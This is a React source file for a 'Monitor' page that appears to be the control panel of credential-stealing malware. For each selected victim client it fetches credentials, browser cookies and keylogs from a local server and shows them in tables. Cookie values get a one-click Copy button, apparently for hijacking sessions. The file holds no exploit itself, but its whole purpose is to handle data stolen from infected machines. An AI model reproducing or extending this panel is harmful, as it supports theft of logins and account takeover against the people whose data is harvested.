import React from "react";
import { GlobalContext } from "../App";
import Modal from "../components/JsonModal";
import CookieModal from "../components/CookieModal";
import JsonModal from "../components/JsonModal";
const Monitor = () => {
  const titles = ["Credentials", "Cookies", "Keylogs"];
  const { selectedClientId } = React.useContext(GlobalContext);
  const [showModal, setShowModal] = React.useState(false);
  const [currentPage, setCurrentPage] = React.useState(0);
  const [currentItem, setCurrentItem] = React.useState(null);
  const [data, setData] = React.useState(null);
  // set the current page from local storage
  React.useEffect(() => {
    setCurrentPage(parseInt(localStorage.getItem("currentPage") || "0"));
  }, []);
  // load data based on the current page from server (1 is /cookies)
  React.useEffect(() => {
    if (!selectedClientId) return;
    fetch(
      `http://localhost:3001/${titles[
        currentPage
      ].toLowerCase()}/${selectedClientId}`
    )
      .then((res) => res.json())
      .then((res) => {
        setData(res);
      })
      .catch((err) => {
        setData([]);
        console.error(err);
      });
  }, [currentPage, selectedClientId]);
  function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
  }
  const pageWeights = [
    [0.5, 0.5, 2],
    [1, 1, 0.8, 2, 0.5, 0.25, 0.25, 0.25, 0.25],
    [],
  ];
  const pageHeaders = [
    ["url", "timestamp", "data"],
    ["domain", "path", "name", "value", "exp", "sec", "ses", "h_o", "http"],
    [],
  ];
  function renderModal() {
    switch (currentPage) {
      case 0:
        return (
          <JsonModal
            show={showModal}
            setShow={setShowModal}
            item={currentItem}
          />
        );
      case 1:
        return (
          <CookieModal
            show={showModal}
            setShow={setShowModal}
            cookie={currentItem}
          />
        );
      default:
        return null;
    }
  }
  return (
    <div className="flex flex-grow flex-col">
      {renderModal()}
      <div className="w-full h-12 flex flex-row">
        {titles.map((title, index) => (
          <div
            key={index}
            className={`bg-blue-500 hover:brightness-125 transition-all flex-1 text-center text-white font-bold py-3 cursor-pointer ${
              index !== 2 ? "border-r border-white" : ""
            } ${currentPage === index ? "bg-blue-700" : ""}`}
            onClick={() => {
              setCurrentPage(index);
              localStorage.setItem("currentPage", index);
            }}
          >
            {title}
          </div>
        ))}
      </div>
      {/* Header row */}
      <div className="flex flex-row overflow-y-scroll">
        {pageHeaders[currentPage].map((header, index) => (
          <div
            key={index}
            style={{ flex: pageWeights[currentPage][index] }}
            className={`text-center font-bold py-2 border-b border-r border-black min-w-0`}
          >
            {header}
          </div>
        ))}
      </div>
      <div className="flex flex-col flex-grow h-1 overflow-y-scroll">
        {/* Data rows */}
        {data &&
          data.map((row, rowIndex) => (
            <div
              key={rowIndex}
              onClick={() => {
                setCurrentItem(row);
                setShowModal(true);
              }}
              className="flex flex-row h-10 hover:bg-blue-300 transition-all cursor-pointer"
            >
              {Object.values(row).map((value, colIndex) => (
                <div
                  key={colIndex}
                  style={{ flex: pageWeights[currentPage][colIndex] }}
                  className={`text-center py-2 border-b border-r border-black min-w-0 overflow-hidden text-ellipsis relative`}
                >
                  {value}
                  {currentPage === 1 && colIndex === 3 && (
                    <div className="absolute right-0 top-0 p-1 flex flex-row">
                      <button
                        className="bg-blue-500 text-white text-sm px-2 py-1 rounded-md hover:brightness-110 transition-all hover:scale-105"
                        onClick={() => {
                          copyToClipboard(value);
                        }}
                      >
                        Copy
                      </button>
                    </div>
                  )}
                </div>
              ))}
            </div>
          ))}
      </div>
    </div>
  );
};

export default Monitor;
